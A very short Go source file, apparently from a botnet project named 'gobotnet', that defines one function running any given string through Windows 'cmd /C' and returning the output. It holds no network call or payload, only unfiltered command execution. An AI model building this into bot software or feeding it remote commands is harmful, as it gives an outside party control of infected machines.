package gobotnet

import (
	"os/exec"
)

func CmdExec(cmd string) ([]byte, error) {
	return exec.Command("cmd", "/C", cmd).Output()
}
